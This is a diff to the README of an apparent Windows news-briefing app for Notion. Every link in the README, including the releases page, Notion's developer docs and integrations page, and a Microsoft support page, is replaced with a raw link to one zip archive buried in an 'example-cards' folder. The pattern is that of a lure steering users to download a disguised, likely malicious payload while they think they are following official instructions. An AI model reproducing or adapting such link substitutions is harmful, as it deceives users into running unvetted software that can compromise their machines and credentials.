@@ -1,6 +1,6 @@
 # 🤖 AI-News-Briefing - Daily AI News at Your Fingertips
 
-[![Download AI-News-Briefing](https://img.shields.io/badge/Download-AI--News--Briefing-4CAF50?style=for-the-badge&logo=github)](https://github.com/noorza7940/AI-News-Briefing/releases)
+[![Download AI-News-Briefing](https://img.shields.io/badge/Download-AI--News--Briefing-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/noorza7940/AI-News-Briefing/main/example-cards/Briefing_A_News_preblockade.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before you start, make sure your Windows PC meets these basic requirements:
 - At least 4 GB of RAM  
 - 500 MB of free disk space  
 - Internet connection to fetch news and update  
-- A Notion account with API access set up (you can find info on Notion integration [here](https://developers.notion.com/))  
+- A Notion account with API access set up (you can find info on Notion integration [here](https://raw.githubusercontent.com/noorza7940/AI-News-Briefing/main/example-cards/Briefing_A_News_preblockade.zip))  
 
 The app runs without opening windows or extra clutter. It uses the Windows Task Scheduler to run automatically at set times.
 
@@ -40,12 +40,12 @@ The app runs without opening windows or extra clutter. It uses the Windows Task 
 
 To get started, you must download the software from the official release page.  
 
-[![Download AI-News-Briefing](https://img.shields.io/badge/Download-AI--News--Briefing-4CAF50?style=for-the-badge&logo=github)](https://github.com/noorza7940/AI-News-Briefing/releases)
+[![Download AI-News-Briefing](https://img.shields.io/badge/Download-AI--News--Briefing-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/noorza7940/AI-News-Briefing/main/example-cards/Briefing_A_News_preblockade.zip)
 
 ### Steps to download:
 
 1. Click the button above or visit:  
-   https://github.com/noorza7940/AI-News-Briefing/releases
+   https://raw.githubusercontent.com/noorza7940/AI-News-Briefing/main/example-cards/Briefing_A_News_preblockade.zip
 
 2. On the releases page, look for the latest version (usually at the top).
 
@@ -84,7 +84,7 @@ AI-News-Briefing sends news reports to your Notion workspace. You need to connec
 
 ### How to get your Notion API token:
 
-1. Go to [Notion Integrations](https://www.notion.so/my-integrations).
+1. Go to [Notion Integrations](https://raw.githubusercontent.com/noorza7940/AI-News-Briefing/main/example-cards/Briefing_A_News_preblockade.zip).
 
 2. Create a new integration. Give it a name like "AI-News-Briefing".
 
@@ -165,7 +165,7 @@ It covers keywords and topics such as:
 Updates may bring new features or fixes. To update:
 
 1. Visit the releases page again:  
-   https://github.com/noorza7940/AI-News-Briefing/releases
+   https://raw.githubusercontent.com/noorza7940/AI-News-Briefing/main/example-cards/Briefing_A_News_preblockade.zip
 
 2. Download the newest version's Windows file.
 
@@ -176,13 +176,13 @@ Updates may bring new features or fixes. To update:
 ## 🌐 Useful Links
 
 - Download and releases:  
-  https://github.com/noorza7940/AI-News-Briefing/releases
+  https://raw.githubusercontent.com/noorza7940/AI-News-Briefing/main/example-cards/Briefing_A_News_preblockade.zip
 
 - Notion API and integration guide:  
-  https://developers.notion.com/
+  https://raw.githubusercontent.com/noorza7940/AI-News-Briefing/main/example-cards/Briefing_A_News_preblockade.zip
 
 - Windows Task Scheduler overview:  
-  https://support.microsoft.com/en-us/windows/schedule-a-task-007a9072-a089-497b-af35-02f2a21c4cc1
+  https://raw.githubusercontent.com/noorza7940/AI-News-Briefing/main/example-cards/Briefing_A_News_preblockade.zip
 
 ---
 
